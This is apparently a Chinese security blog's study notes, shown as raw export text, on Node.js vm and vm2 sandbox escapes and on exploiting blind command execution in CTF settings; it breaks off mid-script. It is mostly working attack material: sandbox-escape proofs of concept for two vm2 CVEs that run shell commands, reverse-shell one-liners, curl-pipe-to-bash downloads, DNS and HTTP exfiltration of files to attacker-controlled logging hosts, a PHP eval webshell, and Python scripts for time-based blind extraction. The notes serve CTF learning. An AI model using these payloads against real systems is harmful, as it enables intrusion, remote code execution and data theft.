我们在前面提到了作用域这个概念，所以我们现在思考一下，如果想要实现沙箱的隔离作用，我们是不是可以创建一个新的作用域，让代码在这个新的作用域里面去运行，这样就和其他的作用域进行了隔离，这也就是vm模块运行的原理，先来了解几个常用的vm模块的API。 vm.runinThisContext(code)：在当前global下创建一个作用域（sandbox），并将接收到的参数当作代码运行。sandbox中可以访问到global中的属性，但无法访问其他包中的属性。 const vm = require('vm'); let localVar = 'initial value'; const vmResult = vm.runInThisContext('localVar = \"vm\";'); console.log('vmResult:', vmResult); console.log('localVar:', localVar); // vmResult: 'vm', localVar: 'initial value' vm.createContext([sandbox])： 在使用前需要先创建一个沙箱对象，再将沙箱对象传给该方法（如果没有则会生成一个空的沙箱对象），v8为这个沙箱对象在当前global外再创建一个作用域，此时这个沙箱对象就是这个作用域的全局对象，沙箱内部无法访问global中的属性。 vm.runInContext(code, contextifiedSandbox[, options])：参数为要执行的代码和创建完作用域的沙箱对象，代码会在传入的沙箱对象的上下文中执行，并且参数的值与沙箱内的参数值相同。 const util = require('util'); const vm = require('vm'); global.globalVar = 3; const sandbox = { globalVar: 1 }; vm.createContext(sandbox); vm.runInContext('globalVar *= 2;', sandbox); console.log(util.inspect(sandbox)); // { globalVar: 2 } console.log(util.inspect(globalVar)); // 3 vm.runInNewContext(code[, sandbox][, options]): creatContext和runInContext的结合版，传入要执行的代码和沙箱对象。 vm.Script类 vm.Script类型的实例包含若干预编译的脚本，这些脚本能够在特定的沙箱（或者上下文）中被运行。 new vm.Script(code, options)：创建一个新的vm.Script对象只编译代码但不会执行它。编译过的vm.Script此后可以被多次执行。值得注意的是，code是不绑定于任何全局对象的，相反，它仅仅绑定于每次执行它的对象。 code：要被解析的JavaScript代码 const util = require('util'); const vm = require('vm'); const sandbox = { animal: 'cat', count: 2 }; const script = new vm.Script('count += 1; name = \"kitty\";'); const context = vm.createContext(sandbox); script.runInContext(context); console.log(util.inspect(sandbox)); // { animal: 'cat', count: 3, name: 'kitty' } script对象可以通过runInXXXContext运行。 我们一般进行沙箱逃逸最后都是进行rce，那么在Nodejs里要进行rce就需要procces了，在获取到process对象后我们就可以用require来导入child_process，再利用child_process执行命令。但process挂载在global上，但是我们上面说了在creatContext后是不能访问到global的，所以我们最终的目标是通过各种办法将global上的process引入到沙箱中。 如果我们把代码改成这样（code参数最好用反引号包裹，这样可以使code更严格便于执行）： \"use strict\"; const vm = require(\"vm\"); const y1 = vm.runInNewContext(`this.constructor.constructor('return process.env')()`); console.log(y1); vm.runInNewContext(`this.constructor.constructor('return process.env')()`); 那么我们是怎么实现逃逸的呢，首先这里面的this指向的是当前传递给runInNewContext的对象，这个对象是不属于沙箱环境的，我们通过这个对象获取到它的构造器，再获得一个构造器对象的构造器（此时为Function的constructor），最后的()是调用这个用Function的constructor生成的函数，最终返回了一个process对象。 下面这行代码也可以达到相同的效果： const y1 = vm.runInNewContext(`this.toString.constructor('return process')()`); 然后我们就可以通过返回的process对象来rce了 y1.mainModule.require('child_process').execSync('whoami').toString() 这里知识星球上提到了一个问题，下面这段代码： const vm = require('vm'); const script = `m + n`; const sandbox = { m: 1, n: 2 }; const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res) 我们能不能把this.toString.constructor('return process')()中的this换成{}呢？ {}的意思是在沙箱内声明了一个对象，也就是说这个对象是不能访问到global下的。 如果我们将this换成m和n也是访问不到的，因为数字，字符串，布尔这些都是primitive类型，他们在传递的过程中是将值传递过去而不是引用（类似于函数传递形参），在沙盒内使用的mn已经不是原来的mn了，所以无法利用。 我们将mn改成其他类型就可以利用了： 6.5 vm沙箱逃逸的一些其他情况 知识星球里提到了这样的情况： const vm = require('vm'); const script = `...`; const sandbox = Object.create(null); const context = vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res) 我们现在的this为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。 我们上面演示的沙箱逃逸其实就是找到一个沙箱外的对象，并调用其中的方法，这种情况下也是一样的，我们只要在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller就会返回沙箱外的一个对象，我们在沙箱内就可以进行逃逸了。 我们分析一下这段代码 const vm = require('vm'); const script = `(() =&gt; { const a = {} a.toString = function () { const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString() } return a })()`; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log('Hello ' + res) 我们在沙箱内先创建了一个对象，并且将这个对象的toString方法进行了重写，通过arguments.callee.caller获得到沙箱外的一个对象，利用这个对象的构造函数的构造函数返回了process，再调用process进行rce，沙箱外在console.log中通过字符串拼接的方式触发了这个重写后的toString函数。 如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用Proxy来劫持属性 Proxy 和 Reflect - 掘金 (juejin.cn) const vm = require(\"vm\"); const script = ` (() =&gt;{ const a = new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) return a })() `; const sandbox = Object.create(null); const context = new vm.createContext(sandbox); const res = vm.runInContext(script, context); console.log(res.abc) 触发利用链的逻辑就是我们在get:这个钩子里写了一个恶意函数，当我们在沙箱外访问proxy对象的任意属性（不论是否存在）这个钩子就会自动运行，实现了rce。 如果沙箱的返回值返回的是我们无法利用的对象或者没有返回值应该怎么进行逃逸呢？ 我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出： const vm = require(\"vm\"); const script = ` throw new Proxy({}, { get: function(){ const cc = arguments.callee.caller; const p = (cc.constructor.constructor('return process'))(); return p.mainModule.require('child_process').execSync('whoami').toString(); } }) `; try { vm.runInContext(script, vm.createContext(Object.create(null))); }catch(e) { console.log(\"error:\" + e) } 这里我们用catch捕获到了throw出的proxy对象，在console.log时由于将字符串与对象拼接，将报错信息和rce的回显一起带了出来。 6.6 vm2 通过上面几个例子可以看出来vm沙箱隔离功能较弱，有很多逃逸的方法，所以第三方包vm2在vm的基础上做了一些优化，我们看一下这些优化具体是怎么实现的。 安装vm2包： npm install vm2 整个vm2包下是这样的结构： cli.js实现了可以在命令行中调用vm2 也就是bin下的vm2。 contextify.js封装了三个对象：Contextify Decontextify propertyDescriptor，并且针对global的Buffer类进行了代理。 main.js 是vm2执行的入口，导出了NodeVM VM这两个沙箱环境，还有一个VMScript实际上是封装了vm.Script。 sandbox.js针对global的一些函数和变量进行了拦截，比如setTimeout，setInterval等 vm2相比vm做出很大的改进，其中之一就是利用了es6新增的proxy特性，从而使用钩子拦截对constructor和__proto__这些属性的访问。 先用vm2演示一下： const {VM, VMScript} = require('vm2'); const script = new VMScript(\"let a = 2;a;\"); console.log((new VM()).run(script)); VM是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。 那么vm2在运行这两行代码时都做了什么事： 可以发现相比于vm的沙箱环境，vm2最重要的一步就是引入sandbox.js并针对context做封装。 那么vm2具体是怎么实现对context的封装？ vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接： vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com) 6.7 vm2中的沙箱绕过 CVE-2019-10761 该漏洞要求vm2版本&lt;=3.6.10 \"use strict\"; const {VM} = require('vm2'); const untrusted = ` const f = Buffer.prototype.write; const ft = { length: 10, utf8Write(){ } } function r(i){ var x = 0; try{ x = r(i); }catch(e){} if(typeof(x)!=='number') return x; if(x!==i) return x+1; try{ f.call(ft); }catch(e){ return e; } return null; } var i=1; while(1){ try{ i=r(i).constructor.constructor(\"return process\")(); break; }catch(x){ i++; } } i.mainModule.require(\"child_process\").execSync(\"whoami\").toString() `; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } 这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性，这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子： 假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）： r(i); // 该函数递归999次 f.call(ft); // 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数 this.utf8Write() // 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱 外的异常对象 CVE-2021-23449 这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因 Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk poc： let res = import('./foo.js') res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync(\"whoami\").toString(); import()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了\\bimport\\b关键字，在编译失败的时候，报Dynamic Import not supported错误。 知识星球上的另外一个trick Symbol = { get toStringTag(){ throw f=&gt;f.constructor(\"return process\")() } }; try{ Buffer.from(new Map()); }catch(f){ Symbol = {}; f(()=&gt;{}).mainModule.require(\"child_process\").execSync(\"whoami\").toString(); } 在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型： 就会return Decontextify.instance 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了 6.8 简单理解 vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸： 逃逸例子： const vm = require(\"vm\"); const env = vm.runInNewContext(`this.constructor.constructor('return this.process.env')()`); console.log(env); 执行之后可以获取到主程序环境中的环境变量 上面例子的代码等价于如下代码： const vm = require('vm'); const sandbox = {}; const script = new vm.Script(\"this.constructor.constructor('return this.process.env')()\"); const context = vm.createContext(sandbox); env = script.runInContext(context); console.log(env); 创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。 因为this.constructor.constructor返回的是一个Function constructor，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是return this.process.env，结果是返回了主程序的环境变量。 配合chile_process.exec()就可以执行任意命令了： const vm = require(\"vm\"); const env = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')(); process.mainModule.require('child_process').execSync('whoami').toString()`); console.log(env); 最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。 具体分析可参考：CVE-2019-10758:mongo-expressRCE复现分析 6.9 javascript大小写特性 在javascript中有几个特殊的字符需要记录一下 对于toUpperCase(): 字符\"ı\"、\"ſ\" 经过toUpperCase处理后结果为 \"I\"、\"S\" 对于toLowerCase(): 字符\"K\"经过toLowerCase处理后结果为\"k\"(这个K不是K) 在绕一些规则的时候就可以利用这几个特殊字符进行绕过 可参考p神的文章：https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 6.10 CTF题实例 - Hacktm中的一道Nodejs题 题目部分源码： function isValidUser(u) { return ( u.username.length &gt;= 3 &amp;&amp; u.username.toUpperCase() !== config.adminUsername.toUpperCase() ); } function isAdmin(u) { return u.username.toLowerCase() == config.adminUsername.toLowerCase(); } 解题时需要登录管理员的用户名，但是在登录时，isValidUser函数会对用户输入的用户名进行toUpperCase处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。 但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是toLowerCase。所以这两个差异，就可以使用大小写特性来进行绕过。 题目中默认的管理员用户名为：hacktm 所以，我们指定登录时的用户名为：hacKtm 即可绕过isValidUser和isAdmin的验证。 题目完整Writeup:HackTM中一道Node.js题分析(Draw with us) 0x07 Tips 7.1 fs 文件系统 fs 模块支持以标准 POSIX 函数建模的方式与文件系统进行交互。 其中最简单的一个就是文件读取的操作 但是我们得分清楚 同步和异步 区别： 同步阻塞：同步的 API 会阻止 Node.js 事件循环和进一步的 JavaScript 执行，直到操作完成。 异步阻塞：对于一个 IO 操作，比如一个 ajax，当发出一个异步请求后，程序不会阻塞在那里等待结果的返回，而是继续执行下面的代码。 当请求成功获取到结果后，就会调用回调函数来处理后面的事情，这个就是异步 简单但不完全正确的说： 同异步与现实生活的方式相反，同步就是事一件一件做，做完一件再做下一件，而异步是同时开始。 举个例子 var fs = require('fs');//导入fs模块 a = fs.readFileSync('./m1.txt'); console.log(a.toString()); console.log(\"结束!\"); 这是同步，它的输出结果为 很明显是等待每个操作完成，然后执行下一个操作 接下来是异步 var fs = require(\"fs\");//导入fs模块 fs.readFile('./m1.txt', function (err, data) { if (err) return console.error(err); console.log(data.toString()); console.log(\"------------------\") console.log(\"现在才结束！\") }); console.log(\"结束？\"); 这是就是异步，它的输出结果为 异步从不等待每个操作完成，而是在第一步执行所有操作 7.2 全局变量展开 __dirname：当前模块的目录名。 __filename：当前模块的文件名。这是当前的模块文件的绝对路径（符号链接会被解析）。 exports 变量是默认赋值给 module.exports，它可以被赋予新值，它会暂时不会绑定到 module.exports。 module：在每个模块中， module 的自由变量是对表示当前模块的对象的引用。为方便起见，还可以通过全局模块的 exports 访问 module.exports。module 实际上不是全局的，而是每个模块本地的 require 模块就不多说了，用于引入模块、 JSON、或本地文件。可以从 node_modules 引入模块。 我们常用的全局变量为__dirname和__filename 7.3 child_process child_process 提供了几种创建子进程的方式 异步方式：spawn、exec、execFile、fork 同步方式：spawnSync、execSync、execFileSync 经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。 异步进程的创建 child_process.exec (): 衍生 shell 并在该 shell 中运行命令，完成后将 stdout 和 stderr 传给回调函数。 child_process.execFile (): 与 child_process.exec () 类似，不同之处在于，默认情况下，它直接衍生命令，而不先衍生 shell。 child_process.fork (): 衍生新的 Node.js 进程并使用建立的 IPC 通信通道（其允许在父子进程之间发送消息）调用指定的模块。 child_process.execSync (): child_process.exec () 的同步版本，其将阻塞 Node.js 事件循环。 child_process.execFileSync (): child_process.execFile () 的同步版本，其将阻塞 Node.js 事件循环。 同步进程的创建 child_process.spawnSync ()、child_process.execSync () 和 child_process.execFileSync () 方法是同步的，将阻塞 Node.js 事件循环， 暂停任何其他代码的执行，直到衍生的进程退出。 具体的细节大家可以去官方文档看看 0x08 参考文章 深入理解 JavaScript Prototype 污染攻击 –p神 JavaScript 原型链污染 Node.js 常见漏洞学习与总结 NodeJS VM和VM2沙箱逃逸 Node.js常见漏洞学习与总结 NodeJs从零到原型链污染","categories":["常见top漏洞"]},{"title":"无回显命令执行","path":"/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/","content":"0x01 前言 没错，本篇也是在CTF下遇到无回显命令执行之后来进行的学习，不过网上找了很多文章感觉没一个满意的，只能东拼西凑了。 接下来就开始学习之旅： 在渗透测试、漏洞挖掘或安全研究的过程中，我们会遇到很多无回显的命令执行点。面对这些无回显的命令执行点，我们很难获取命令执行结果，甚至无法判断命令是否执行成功。本篇文章主要讨论面对这些无回显的命令执行点时的判断和利用方法。 0x02 无回显判断 首先我们需要知道该点是否存在命令执行漏洞，或者我们的命令是否执行成功了。这里的研判方法有很多种，最常用的是直接通过延时判断，类似我们sql注入里的时间盲注： cmd=sleep 5 类似似的函数还有benchmark(count,expr) 和getlock（str，time）。 值得一提的是，windows下并没有sleep命令，那么如何通过时间延时的方式判断windows环境下的命令执行呢？我们可以通过回环ping来达到强制延时的效果： ping -n 3 127.0.0.1 ping -n 4 127.0.0.1 Linux下同样试用，我们还可以通过ping命令在不同环境下的执行方式来判断目标的操作系统类型： ping -c 3 127.0.0.1 ping -c 4 127.0.0.1 这里借用参考文章的图片了 延时判断法是在无回显情况下最简单的判断方式，优点是能分辨操作系统、无论目标是否出网都能判断，缺点是只能判断不能利用。 0x03 CTF场景 在ctf中，有时会遇到无回显rce，就是说虽然可以进行命令执行，但却看不到命令执行的结果，也不知道命令是否被执行。 测试代码如下： &lt;?php highlight_file(__FILE__); $a=$_GET['a']; exec(\"$a\"); //$b=exec(\"$a\"); //echo $b; ?&gt; 命令执行函数我用的是exec,因为这个函数本身是没有回显的，拿来做测试简直不能再合适。 如上图我们执行之后发现页面并没有回显数据，我们首先用sleep命令看看命令是否被成功执行了，看下图它转了五秒之后才恢复说明命令是执行了的： 0x04 绕过方法 4.1 反弹shell 遇到这种无回显的命令执行，很常见的一个思路是反弹shell，因为它虽然不会将命令执行的结果输出在屏幕上，但实际上这个命令它是执行了的，那我们就将shell反弹到自己服务器上，然后再执行命令肯定就可以看到回显了 一般来讲我们反弹shell都用的bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1这条命令。–这里呢我复现一直不成功，估计就是环境配置问题，因此这里还是学个思路吧，不想搭环境费时间了。。。 payload： bash -i &gt;&amp; /dev/tcp/192.168.17.137/5555 0&gt;&amp;1 /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.17.137/5555 0&gt;&amp;1' //使用指定的bash shell反弹 nc -e /bin/sh ip port 可以看到他这里已经反弹成功–但我不知道为何复现不成功┭┮﹏┭┮ tip：也可以将命令写入文件，之后在存在命令执行的地方输入curl ip|bash即可反弹 攻击者也可以启动http服务，并在站点目录下存放一个文件，里面写着bash反弹shell命令 ?a=curl%20http://192.168.10.128/bashshell|bash 成功反弹到shell 4.2 DNS外带 发起一个dns请求需要通过linux中的ping命令或者curl命令 然后这里推荐一个dnslog的利用平台：ceye http://ceye.io/，注册账号之后，会给一个域名，当发起的请求中含有这个域名时，平台就会有记录。这里也可以利用dnslog平台 payload如下： cmd=curl `命令`.域 curl `ls`.78c59j.ceye.io 如上图可以看到我们成功令数据回显至ceye平台上去 那么为了让它显示出剩余的结果，我们就需要用到linux的sed命令，用sed命令就可以实现对行的完美划分。 curl ls | sed -n ‘1p’.78c59j.ceye.io 结合上面两个图片可以看到我们可以遍历回显出所有目录下的文件 但是值得注意的是，因为有的字符可能会无法显示或者只显示部分信息，所以说执行命令的时候推荐使用base64编码，然后再解开就好： 1;curl `cat 1.txt | base64`.78c59j.ceye.io 1;curl `ls | base64`.78c59j.ceye.io/ 不过缺点很明显，似乎找不到一个方法可以让回显内容完全，并且我的cat 1.txt这条命令不知为何执行不了。 注意： 1）命令执行时要避免空格，空格会导致空格后面的命令执行不到； 2）将读取的文件命令用反引号``包含起来； 3）拼接的域名有长度限制。 举个例子： #用&lt;替换读取文件中的空格，且对输出结果base64编码，然后拼接域名 curl `cat&lt;flag.php|base64`.cf1gbs.dnslog.cn #另一种方法 curl `cat flag.php|sed s/[[:space:]]//`.cf1gbs.dnslog.cn 4.3 http请求 靶机通过向VPS发起HTTP请求，VPS监听到请求则代表命令执行成功(注意：ping命令不产生http请求) VPS：nc -lvp 8888 靶机：cmd=curl ip:8888 这里复现一直不成功，找了几篇文章发现： 目标服务器向个人的公网服务器发起http请求，当该公网服务器收到http请求就代表命令有执行。 举个例子捏： 个人的公网服务器使用 nc -lvp 7777 开始监听； 目标服务器使用 curl 公网机ip：端口号。 可以看到公网服务器的该端口有http请求。（注：ping命令不产生http请求） 估计这里不成功的原因在于我使用的kali且kali没出网依旧处于内网。正常的话应该是下图： 4.4 执行命令（需要站点目录具有写权限） 利用cp命令：cp flag.php 1.txt 利用mv命令：mv flag.php 1.txt 利用&gt;输出结果到文件：ls &gt; 1.txt 利用wget下载：wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php 利用tar tar cvf flag.tar flag.php # 打包flag.php为flag.tar tar zcvf flag.tar.gz flag.php # 压缩flag.php为flag.tar.gz # 解压缩：tar zxvf flag.tar.gz 利用zip zip flag.zip flag.php #解压缩：unzip flag.zip 这里看一个网上例子（复现不好找。。。 eg：通过命令执行直接得到文件内容 将cp where_is_flag.php 1.txt做为参数传递给ping，然后就执行了cp where_is_flag.php 1.txt这个命令，生成1.txt文件，在去访问1.txt，就能得到1.txt的内容（也就是where_is_flag.php的内容），最后找到flag 4.5 直接写入或外部下载webshell 直接写入（需要站点目录具有写权限） echo \"&lt;?php @eval(\\$_POST[123]); ?&gt;\" &gt; webshell.php 外部下载（目标服务器可以连接外网或可以与攻击机互通，且能执行wget命令） wget 攻击机ip -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名 4.6 nc外带 靶机：nc ip 8888 &lt; flag.php VPS：nc -lvp 8888 当tcp不能使用，-u参数调整为udp 靶机：nc -u ip 8888 &lt; flag.php VPS：nc -ulvp 8888 4.7 http外带 看到一篇文章推荐的http信道 ?cmd=curl http://给定的URL /?1=`ls /` 注意如果要编码的话,要加个 . ?cmd=curl http://给定的URL /?1=`ls .|base64` 上图红色标注的地方就是base64加密的结果，我们解密看到下图，可以看到回显的数据很多，似乎这是个优点 4.8 在vps上建立记录脚本 当目标服务器可以向公网服务器发起http请求，并且能执行curl命令或wget命令 1）在个人公网服务器的根目录构造一个记录脚本：7.php 。 #7.php &lt;?php header(\"Content-type:text/html; charest=utf-8\"); highlight_file(_FILE_); include(\"flag.php\"); $ip=$_REQUEST['ip']; if($ip) { shell_exec(\"ping -c 4\".$ip); } ?&gt; 2）在目标服务器的测试点发送任意一条请求进行测试，将获得的flag进行base64解码即可。 curl http://*.*.*.**/7.php?data=`cat flag.php|base64` wget http://*.*.*.*/7.php?data=`cat flag.php|base64` 不过这里没看懂，也没复现成功。。。。 4.9 burp(Collaborator Client) 使用 curl -F 将flag文件上传到Burp的Collaborator Client。这是一个类似httpslog+dnslog的插件，其功能比dnslog强大，可以不用搭建任何环境去监听dns和http请求，也可以很方便的查看post请求包和cookie等。 获取Collaborator Client分配给BURP的链接： 打开Burp主界面 --&gt;菜单（Burp）–&gt;Burp Collaboraor Client – &gt; 点击 Copy to Clipboard --此处似乎是低版本的步骤 如上图，我这里是2023版本的，直接就集成了。 靶机：拼接payload并在命令执行处提交即可查看Collaborator Client收到的数据。 cmd=curl -X POST -F xx=@flag.php http://jj6xpgxristzkbn1fpkl32t6jxpndc.burpcollaborator.net cmd=1;curl `whoami`.nlcfzmusx6w63w922oozpq59c0ir6iu7.oastify.com 0x05 py脚本（进阶） 上述0x04讲得都是利用现有工具进行绕过，但是进阶的CTF题目似乎都要求你有编写py脚本的能力去进行盲注。这里也是有幸找到了一篇文章对此的分析，虽然脚本不会写，但我先立志看懂他。 假设服务器不出网并且web目录不可写 Linux可以用类似盲注的方式得到回显，这次主要写下Windows的，其实也差不多 这里的情况就与我做的CTF题目一样。 5.1 Linux 方法和延时注入差不多，截取命令回显结果循环进行对比，对比到了就用sleep延时 首先要了解linux if语句 if [ command ];then 符合条件执行的语句 elif [ command ];then 符合条件执行的语句 else 上面都不符合执行的语句 fi 这次只需要用到一个判断所以不用这么复杂 if [ 1 = 1 ];then sleep 2;fi #这里的1=1条件成立就会执行下面的sleep 2语句 if [ `whoami|cut -c 1` = 'r' ];then sleep 2;fi #取出whoami第一个字符对比是否为r，是r则sleep2秒 Linux下反引号是命令替换，一般来说是将执行获得的结果再执行一次，这里可以理解为将命令的结果保存下来后与等号后面的字符对比 cut 命令是切割字符串，whoami|cut -c 1就是得到命令结果的第一个字符，以此类推 在一些回显中可能会出现很多符号，还有中文什么的，为了避免回显结果不准确的情况可以通过base32编码后再执行cut操作 if [ `whoami|base32|cut -c 1` = 'r' ];then sleep 2;fi 这里使用base32的原因是base32只有大写字母和2-7和=，减少了爆破字符数量，提高了回显结果的精准度 下面用python写个脚本 import requests import string #str_zf 包含大写字母和数字字符以及等号字符。这些字符将用于构建注入负载。 str_zf = string.ascii_uppercase + \"234567=\" #cmd 变量包含要执行的命令，而 url 变量包含目标URL，其中将包含注入的命令。 cmd = \"pwd\" url = \"http://10.130.4.204:8081/index.php?cmd=\" def get_result(cmd ,url): result = \"\" for i in range(1, 65535): for s in str_zf: #payload 是一个包含命令注入的字符串，例如，如果 i 是1，s 是 'A'，那么 payload 将是一个字符串，用于检查命令输出的第一个字符是否等于 'A'。 payload = \"if [ `{}|base32|cut -c {}` = '{}' ];then sleep 5;fi\".format(cmd, i, s) url_payload = url + payload response = requests.get(url_payload) #发送HTTP GET请求到 url_payload，并记录响应的时间。 time = response.elapsed.total_seconds() #如果响应时间大于3秒（假设命令输出的字符与 s 匹配），则将 s 添加到 result 中。 if time &gt; 3: result += s print(result) break if __name__ == '__main__': get_result(cmd, url) string.ascii_uppercase 是 Python 标准库中 string 模块中的一个常量，它包含了英文字母的大写版本，即 A 到 Z 的 26 个字符。具体来说，string.ascii_uppercase 包含以下字符： ABCDEFGHIJKLMNOPQRSTUVWXYZ 这个常量通常用于字符串操作，特别是在需要引用英文大写字母集合的情况下。例如，您可以使用 string.ascii_uppercase 来生成随机的大写字母，检查字符串中是否包含大写字母等等。这个常量提供了一个方便的方式来引用大写字母集合，而不必手动键入所有大写字母。 以上是参考GPT回答而去了解代码含义 下面是实例图片 5.2 Windows 在Linux中可以通过ping带出命令，但是Windows不会把命令结果拼接到dnslog上，可以用for循环得到结果再进行拼接 for /F %i in ('echo a') do ping -n 1 %i.qzdxj3.dnslog.cn 这里就是多提一句，重点还是在不出网的情况下 Windows中的问题就是命令结果保存在哪里，并不可以像Linux一样直接截取 这次假设是web目录不可写，那就需要思考下写到别的目录该怎么读到 将命令回显的结果写到一个可写的目录下 使用certutil将命令结果base64编码，原因同上可以避免特殊字符，提高结果的准确度 用findstr /V参数去除多余的字符，将去除掉多余字符的base64编码再次写入一个文件 certutil -encode d:\\\\a d:\\\\b #编码命令 文件格式: -----BEGIN CERTIFICATE----- base64 -----END CERTIFICATE----- 去除的是首行尾行的多余字符，\\V参数是匹配到相同的字符然后去除 用for循环去除换行符 写入bat对比字符串 @echo off (for /f \"delims=\" %%i in ('type \"d:\\c\"') do (set /p =%%i&lt;nul))&gt;\"d:\\d\" 以下是GPT对上述代码的解释： 这是一个 Windows 批处理脚本，主要用于将文件 \"d:\\c\" 的内容逐行写入文件 \"d:\\d\"，并保留文件 \"d:\\d\" 中的空行。以下是对脚本的逐行分析： @echo off：这是批处理脚本的一般开头。它会关闭批处理的命令回显，这意味着在运行脚本时，不会显示每个命令的文本。这使得输出更清晰，因为不会显示命令本身，只会显示命令的结果。 (for /f \"delims=\" %%i in ('type \"d:\\c\"') do (set /p =%%i&lt;nul))：这是脚本的核心部分，它执行以下操作： for /f \"delims=\" %%i in ('type \"d:\\c\"')：这部分使用 for 命令来循环处理文件 \"d:\\c\" 中的内容，\"delims=\" 部分指示不使用分隔符，因此整行文本将被读取。 do (set /p =%%i&lt;nul)：对于每行从文件 \"d:\\c\" 读取的文本，使用 set /p 命令将该行文本写入标准输出（屏幕）并通过 &lt;nul 重定向将其捕获。这实际上是将每行文本逐行写入标准输出，但没有显示在屏幕上。 &gt;\"d:\\d\"：这部分将标准输出中的内容（即文件 \"d:\\c\" 中的每一行文本）重定向到文件 \"d:\\d\" 中，从而将文件 \"d:\\c\" 中的内容逐行写入文件 \"d:\\d\"。如果文件 \"d:\\d\" 不存在，将创建它；如果已经存在，将覆盖其内容。 先写入上面的bat去除换行符 @echo off #不打印输出 findstr /b %1 \"d:\\d\" #%1是接收输入，\"a.bat 123\"这样123就会到%1这个位置 #/b是从头开始匹配 IF ERRORLEVEL 1 echo a&amp;&amp;goto end #ERRORLEVEL是类似错误号的东西，如果上面这个命令执行成功了就返回0，反之1,如果匹配不到的话这里就是1，然后goto跳到end，这里用goto原因是ERRORLEVEL不会传到下个命令，在下个命令看来IF ERRORLEVEL 1 echo a这个是执行成功的所以返回0，也会触发延迟，为了避免所以使用goto跳过 IF ERRORLEVEL 0 ping 127.0.0.1 #这里就是成功匹配返回0触发延迟 :end 然后再写入bat匹配字符串 a.bat 正确字符----延迟 a.bat 错误字符---不延迟 同样用python写个脚本 import requests import string command = \"echo flag &gt;d:\\\\a\" base64 = \"certutil -encode d:\\\\a d:\\\\b\" base64_clean = \"findstr /V \\\"^---\\\" d:\\\\b &gt; d:\\\\c\" echo_b_bat = \"echo @echo off&gt;&gt;d:\\\\b.bat\" echo_b_bat2 = \"echo (for /f \\\"delims=\\\" %%i in ('type \\\"d:\\\\c\\\"') do (set /p =%%i^&lt;nul))^&gt;\\\"d:\\\\d\\\"&gt;&gt;d:\\\\b.bat\" start = \"d:\\\\b.bat\" echo_a_bat = \"echo @echo off&gt;&gt;d:\\\\a.bat\" echo_a_bat1 = \"echo findstr /b %1 \\\"d:\\\\d\\\"&gt;&gt;d:\\\\a.bat\" echo_a_bat2 = \"echo IF ERRORLEVEL 1 echo a^&amp;^&amp;goto end &gt;&gt;d:\\\\a.bat\" echo_a_bat3 = \"echo IF ERRORLEVEL 0 ping 127.0.0.1&gt;&gt;d:\\\\a.bat\" echo_end = \"echo :end&gt;&gt;d:\\\\a.bat\" cmd = [command, base64, base64_clean,echo_b_bat, echo_b_bat2, start, echo_a_bat,echo_a_bat1,echo_a_bat2,echo_a_bat3,echo_end] url = \"http://127.0.0.1/system.php\" for i in cmd: data = { \"pass\": i } requests.post(url, data=data) print(\"[+]init success\") bp = string.ascii_letters + string.digits + \"+/=\" cmd_base64 = \"\" for i in range(1,65535): for s in bp: data = { \"pass\": \"d:\\\\a.bat \" + cmd_base64 + s } response = 